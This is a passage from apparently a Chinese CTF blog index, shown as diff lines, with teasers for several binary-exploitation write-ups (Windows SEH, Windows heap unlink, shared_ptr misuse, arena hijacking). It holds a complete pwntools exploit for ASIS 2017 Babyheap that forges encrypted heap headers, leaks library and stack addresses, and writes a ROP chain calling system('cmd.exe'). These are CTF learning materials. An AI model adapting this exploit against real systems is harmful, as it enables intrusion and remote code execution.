</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 4 48&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 5 48&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 6 48&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;f 8 48&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;</span>,<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/" class="post-title-link" itemprop="url">(windows SEH利用)babystack</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 22:51:11" itemprop="dateCreated datePublished" datetime="2020-07-26T22:51:11+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:38:45" itemprop="dateModified" datetime="2025-06-26T10:38:45+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>用IDA分析一下，栈溢出漏洞</p>
+<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image1.png" class>
+
+<p>但是程序结尾不能ret，直接exit了</p>
+<img src="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/image2.png" class>
+
+<p>我们注意到，程序开始时，注册了SHE处理</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/ha1vk/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/" class="post-title-link" itemprop="url">ASIS_2017_Babyheap_Windows_unlink</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 21:39:00" itemprop="dateCreated datePublished" datetime="2020-07-26T21:39:00+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-25 15:31:01" itemprop="dateModified" datetime="2025-06-25T15:31:01+08:00">2025-06-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>用IDA分析一下，在edit功能里，没有检查length，可以直接溢出</p>
+<img src="/ha1vk/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/image1.png" class="">
+
+<p>由于是在windows server 2016上，所以堆header有加密，通过伪造header里的flag状态为0，然后设置好fd、bk，unlink即可。经过测试，在这个版本的windows上，可以直接unlink，只需要注意，在windows里fd和bk指向的是堆的content出，而不是header处。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;192.168.232.137&#x27;,6666)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26285</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;gift : &#x27;</span>)</span><br><span class="line">exe_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x1090</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;exe_base=&#x27;</span>,<span class="built_in">hex</span>(exe_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&quot;What&#x27;s your choice?&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;sword?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;it!&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&quot;What&#x27;s your choice?&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;destroy?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&quot;What&#x27;s your choice?&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;polish?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;time?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;again :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&quot;What&#x27;s your choice?&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;check?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">addr</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&quot;What&#x27;s your choice?&quot;</span>,<span class="string">&quot;1337&quot;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;target?&#x27;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露堆头</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">header_data = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;header_data=&#x27;</span>,<span class="built_in">hex</span>(header_data)</span><br><span class="line"><span class="comment">#计算出用于加密的mask</span></span><br><span class="line">first_4_mask = (header_data &amp; <span class="number">0xFFFFFFFF</span>) ^ <span class="number">0x10010011</span></span><br><span class="line">prev_size_mask = ((header_data &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>) ^ <span class="number">0x4</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;first_4_mask=&#x27;</span>,<span class="built_in">hex</span>(first_4_mask)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;prev_size_mask=&#x27;</span>,<span class="built_in">hex</span>(prev_size_mask)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造1的header</span></span><br><span class="line">size = <span class="number">0x4</span></span><br><span class="line">flag = <span class="number">0</span> <span class="comment">#当前chunk的空闲状态</span></span><br><span class="line"><span class="comment">#计算校验字节</span></span><br><span class="line">smallTagIndex = flag ^ size</span><br><span class="line">fake_header1 = (smallTagIndex &lt;&lt; <span class="number">24</span>) + (flag &lt;&lt; <span class="number">16</span>) + size</span><br><span class="line"><span class="comment">#加密header</span></span><br><span class="line">fake_header1 = fake_header1 ^ first_4_mask</span><br><span class="line">prev_size = <span class="number">0x3</span></span><br><span class="line"><span class="comment">#加密prev_size</span></span><br><span class="line">prev_size ^= prev_size_mask</span><br><span class="line">fake_header1 = (<span class="number">0x8</span> &lt;&lt; <span class="number">56</span>) + (prev_size &lt;&lt; <span class="number">32</span>) + fake_header1</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fake_header1=&#x27;</span>,<span class="built_in">hex</span>(fake_header1)</span><br><span class="line"><span class="comment">#伪造2的header</span></span><br><span class="line">size = <span class="number">0x11</span></span><br><span class="line">flag = <span class="number">1</span> <span class="comment">#当前chunk的空闲状态</span></span><br><span class="line"><span class="comment">#计算校验字节</span></span><br><span class="line">smallTagIndex = flag ^ size</span><br><span class="line">fake_header2 = (smallTagIndex &lt;&lt; <span class="number">24</span>) + (flag &lt;&lt; <span class="number">16</span>) + size</span><br><span class="line"><span class="comment">#加密header</span></span><br><span class="line">fake_header2 = fake_header2 ^ first_4_mask</span><br><span class="line">prev_size = <span class="number">0x4</span></span><br><span class="line"><span class="comment">#加密prev_size</span></span><br><span class="line">prev_size ^= prev_size_mask</span><br><span class="line">fake_header2 = (<span class="number">0x8</span> &lt;&lt; <span class="number">56</span>) + (prev_size &lt;&lt; <span class="number">32</span>) + fake_header2</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fake_header2=&#x27;</span>,<span class="built_in">hex</span>(fake_header2)</span><br><span class="line"><span class="comment">#溢出，修改1、2的header，同时1中伪造好fd和bk</span></span><br><span class="line">heap1_ptr_addr = exe_base + <span class="number">0x4374</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap1_ptr_addr=&#x27;</span>,<span class="built_in">hex</span>(heap1_ptr_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(fake_header1) + p32(heap1_ptr_addr - <span class="number">0x4</span>) + p32(heap1_ptr_addr) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span> + p64(fake_header2))</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">puts_iat = exe_base + <span class="number">0x30c8</span></span><br><span class="line">HeapAlloc_iat = exe_base + <span class="number">0x300C</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,p32(puts_iat) + p32(<span class="number">0</span>) + p32(HeapAlloc_iat) + p32(heap1_ptr_addr))</span><br><span class="line"><span class="comment">#泄露puts地址</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show : &#x27;</span>)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">ucrtbase = puts_addr - <span class="number">0x95a30</span></span><br><span class="line">system_addr = ucrtbase + <span class="number">0xb8320</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#泄露ntdll地址</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show : &#x27;</span>)</span><br><span class="line">HeapAlloc_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">ntdll_base = HeapAlloc_addr - <span class="number">0x40120</span></span><br><span class="line"><span class="comment">#得到peb指针的地址</span></span><br><span class="line">Peb_ptr_addr = ntdll_base + <span class="number">0x10ebac</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;ntdll_base=&#x27;</span>,<span class="built_in">hex</span>(ntdll_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Peb_ptr_addr=&#x27;</span>,<span class="built_in">hex</span>(Peb_ptr_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x4</span>,p32(Peb_ptr_addr))</span><br><span class="line"><span class="comment">#泄露peb的地址</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show : &#x27;</span>)</span><br><span class="line">peb_base = u32(sh.recvuntil(<span class="string">&#x27;\r&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x21c</span></span><br><span class="line">stack_ptr_addr = peb_base + <span class="number">0x3000</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;peb_base=&#x27;</span>,<span class="built_in">hex</span>(peb_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_ptr_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_ptr_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x4</span>,p32(stack_ptr_addr))</span><br><span class="line"><span class="comment">#泄露栈地址</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show : &#x27;</span>)</span><br><span class="line">stack_addr = u32(sh.recvuntil(<span class="string">&#x27;\r&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">rop_addr = stack_addr + <span class="number">0xc0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;rop_addr=&#x27;</span>,<span class="built_in">hex</span>(rop_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0xC</span>,p32(rop_addr) + <span class="string">&#x27;cmd.exe\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#写rop</span></span><br><span class="line">rop = p32(system_addr) + p32(<span class="number">0</span>) + p32(heap1_ptr_addr + <span class="number">0x4</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0xC</span>,rop)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;What&#x27;s your choice?&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/gyctf_2020_foolish_query/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/07/26/gyctf_2020_foolish_query/" class="post-title-link" itemprop="url">gyctf_2020_foolish_query(C++中的shared ptr指针的误用)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 19:33:11" itemprop="dateCreated datePublished" datetime="2020-07-26T19:33:11+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:32:33" itemprop="dateModified" datetime="2025-06-26T10:32:33+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image1.png" class>
+
+<p>然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于<strong>调用了shared ptr的get函数，取得了对象的指针值</strong>，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的<strong>地址值</strong>创建了一个新的shared_ptr对象，因此，前面shard_ptr指针里的计数不会被传递给新创建的这个shared_ptr对象，因此这个局部的shared_ptr对象析构时，把受托管的对象也给free掉了。</p>
+<img src="/ha1vk/2020/07/26/gyctf_2020_foolish_query/image2.png" class>
+
+<p>因此，我们第一次query，创建了一个对象，第二次query这个对象，将使得该对象被free，第三次query将使得程序崩溃，原因是结构体里的指针由于free被破坏了。经过分析，对象的结构体是这样的</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/ha1vk/2020/07/26/gyctf_2020_foolish_query/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/X-nuca_2018_revenge/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/07/26/X-nuca_2018_revenge/" class="post-title-link" itemprop="url">X-nuca_2018_revenge(控制程序流程的新姿势+多字节的xchg指令会清零寄存器高位)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 19:02:11" itemprop="dateCreated datePublished" datetime="2020-07-26T19:02:11+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:28:10" itemprop="dateModified" datetime="2025-06-26T10:28:10+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/07/26/X-nuca_2018_revenge/image1.png" class>
+
+<p>然后，我们用IDA分析一下，bss上存在无限溢出</p>
+<img src="/ha1vk/2020/07/26/X-nuca_2018_revenge/image2.png" class>
+
+<p>由于该程序是静态编译，我们可以覆盖到下方某些函数指针，我们可以将__printf_arginfo_table虚表指针覆盖，指向我们可控的地方。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/ha1vk/2020/07/26/X-nuca_2018_revenge/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/n1ctf2018_null/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/07/26/n1ctf2018_null/" class="post-title-link" itemprop="url">n1ctf2018_null（通过劫持线程arena达到任意地址分配）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 18:29:11" itemprop="dateCreated datePublished" datetime="2020-07-26T18:29:11+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:24:01" itemprop="dateModified" datetime="2025-06-26T10:24:01+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/07/26/n1ctf2018_null/image1.png" class>
+
+<p>然后，我们用IDA分析一下，主函数启动了一个线程</p>
+<img src="/ha1vk/2020/07/26/n1ctf2018_null/image2.png" class>
+
+<p>在线程里，是一个循环</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/ha1vk/2020/07/26/n1ctf2018_null/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
